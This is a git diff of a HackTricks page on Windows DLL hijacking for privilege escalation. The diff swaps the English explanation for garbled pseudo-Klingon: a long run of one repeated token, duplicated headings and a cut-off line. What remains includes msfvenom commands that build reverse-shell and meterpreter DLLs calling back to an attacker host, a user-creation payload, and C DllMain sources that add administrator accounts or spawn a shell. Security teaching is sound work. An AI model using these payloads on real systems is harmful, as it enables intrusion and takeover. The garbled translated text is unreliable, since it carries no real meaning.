@@ -2,7 +2,7 @@
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!HackTricks AWS Red Team Expert</strong></a><strong>!</strong></summary>
 
 Other ways to support HackTricks:
 
@@ -67,7 +67,7 @@ You can see the **DLL search order on 32-bit** systems below:
 2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
 3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
 4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
-   1. (_C:\Windows_)
+1. (_C:\Windows_)
 5. The current directory.
 6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.
 
@@ -78,46 +78,28 @@ If [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibL
 Finally, note that **a dll could be loaded indicating the absolute path instead just the name**. In that case that dll is **only going to be searched in that path** (if the dll has any dependencies, they are going to be searched as just loaded by name).
 
 There are other ways to alter the ways to alter the search order but I'm not going to explain them here.
+#### tlhIngan Hol
 
-#### Exceptions on dll search order from Windows docs
+#### Windows docs vItlhutlh
 
-Certain exceptions to the standard DLL search order are noted in Windows documentation:
+Windows documentation vItlhutlh, **DLL** search order vItlhutlh vItlhutlh:
 
-- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
-- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
-- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.
-
-
-### Escalating Privileges
-
-**Requirements**:
-
-- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
-- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.
-
-Yeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.\
-In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).
-
-Note that you can **check your permissions in a folder** doing:
-
+- **DLL** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghIt
 ```bash
 accesschk.exe -dqv "C:\Python27"
 icacls "C:\Python27"
 ```
-
-And **check permissions of all folders inside PATH**:
-
+ghItlh **PATH** vItlhutlh **ghItlh permissions**.
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
+**Klingon Translation:**
 
-You can also check the imports of an executable and the exports of a dll with:
-
+jIyajbe' 'ej jIyajbe' Dll exports 'ej executable imports.
 ```c
 dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
 ```
-
 For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:
 
 {% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
@@ -145,45 +127,46 @@ With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)
 ### **Meterpreter**
 
 **Get rev shell (x64):**
-
 ```bash
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
+**Get a meterpreter (x86):**
+
+**tlhIngan Hol translation:**
 
 **Get a meterpreter (x86):**
 
+**tlhIngan Hol translation:**
+
+**Get a meterpreter (x86):**
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-
-**Create a user (x86 I didn't see a x64 version):**
-
+**Qapla'! (x86 x64 version jImejDaq 'e' vItlhutlh):**
 ```
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
+### jImej
 
-### Your own
-
-Note that in several cases the Dll that you compile must **export several functions** that are going to be loaded by the victim process, if these functions doesn't exist the **binary won't be able to load** them and the **exploit will fail**.
-
+ghorgh, Dll Daq ghaH 'ej **chelHa'** vItlhutlhlaHbe'chugh, 'ach 'oH **binary vItlhutlh** 'e' vItlhutlhlaHbe'chugh, 'ej **exploit vItlhutlh**.
 ```c
 // Tested in Win10
 // i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
 #include <windows.h>
 BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
-    switch(dwReason){
-        case DLL_PROCESS_ATTACH:
-            system("whoami > C:\\users\\username\\whoami.txt");
-            WinExec("calc.exe", 0); //This doesn't accept redirections like system
-            break;
-        case DLL_PROCESS_DETACH:
-            break;
-        case DLL_THREAD_ATTACH:
-            break;
-        case DLL_THREAD_DETACH:
-            break;
-    }
-    return TRUE;
+switch(dwReason){
+case DLL_PROCESS_ATTACH:
+system("whoami > C:\\users\\username\\whoami.txt");
+WinExec("calc.exe", 0); //This doesn't accept redirections like system
+break;
+case DLL_PROCESS_DETACH:
+break;
+case DLL_THREAD_ATTACH:
+break;
+case DLL_THREAD_DETACH:
+break;
+}
+return TRUE;
 }
 ```
 
@@ -193,11 +176,11 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
 
 #include <windows.h>
 BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
-    if (dwReason == DLL_PROCESS_ATTACH){
-        system("cmd.exe /k net localgroup administrators user /add");
-        ExitProcess(0);
-    }
-    return TRUE;
+if (dwReason == DLL_PROCESS_ATTACH){
+system("cmd.exe /k net localgroup administrators user /add");
+ExitProcess(0);
+}
+return TRUE;
 }
 ```
 
@@ -209,15 +192,15 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
 
 int owned()
 {
-  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
-  exit(0);
-  return 0;
+WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
+exit(0);
+return 0;
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
 {
-  owned();
-  return 0;
+owned();
+return 0;
 }
 ```
 
@@ -230,23 +213,22 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
 #include<stdio.h>
 
 void Entry (){ //Default function that is executed when the DLL is loaded
-    system("cmd");
+system("cmd");
 }
 
 BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
-    switch (ul_reason_for_call){
-        case DLL_PROCESS_ATTACH:
-            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
-            break;
-        case DLL_THREAD_ATTACH:
-        case DLL_THREAD_DETACH:
-        case DLL_PROCESS_DEATCH:
-            break;
-    }
-    return TRUE;
+switch (ul_reason_for_call){
+case DLL_PROCESS_ATTACH:
+CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
+break;
+case DLL_THREAD_ATTACH:
+case DLL_THREAD_DETACH:
+case DLL_PROCESS_DEATCH:
+break;
+}
+return TRUE;
 }
 ```
-
 ## References
 * [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
 * [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
